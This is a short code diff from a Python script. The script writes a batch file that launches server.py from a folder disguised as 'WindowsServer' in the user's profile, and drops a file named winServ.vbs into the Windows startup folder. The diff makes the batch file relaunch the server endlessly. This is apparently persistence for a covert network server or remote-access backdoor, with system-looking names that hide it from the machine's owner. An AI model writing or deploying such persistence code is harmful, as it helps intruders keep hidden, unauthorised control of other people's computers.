@@ -64,7 +64,9 @@ client.close()
 conn.close()
 
 '''
-batch_content = fr'''"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"'''
+batch_content = fr''':loop
+"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"
+goto loop'''
 
 
 vbs_content = fr'''
@@ -85,3 +87,4 @@ with open("server.bat",'w') as f:
 os.chdir(startup_path)
 with open("winServ.vbs",'w') as f:
     f.write(vbs_content)
+
